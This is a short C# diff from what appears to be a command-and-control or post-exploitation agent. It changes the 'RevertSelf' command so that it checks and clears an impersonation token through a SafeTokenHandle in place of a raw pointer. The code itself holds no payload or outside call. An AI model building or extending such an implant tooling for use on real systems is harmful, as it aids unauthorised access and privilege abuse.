@@ -13,6 +13,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using WinAPI;
 
 namespace Commands
 {
@@ -21,13 +22,13 @@ namespace Commands
         public override CommandId Command => CommandId.RevertSelf;
         public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
         {
-            if (context.Agent.ImpersonationToken == IntPtr.Zero)
+            if (context.Agent.ImpersonationToken == null || context.Agent.ImpersonationToken.IsInvalid)
             {
                 context.Error($"No impersonation to revert");
                 return;
             }
 
-            context.Agent.ImpersonationToken = IntPtr.Zero;
+            context.Agent.ImpersonationToken = SafeTokenHandle.InvalidHandle;
             context.AppendResult($"Reverted to self");
         }
     }
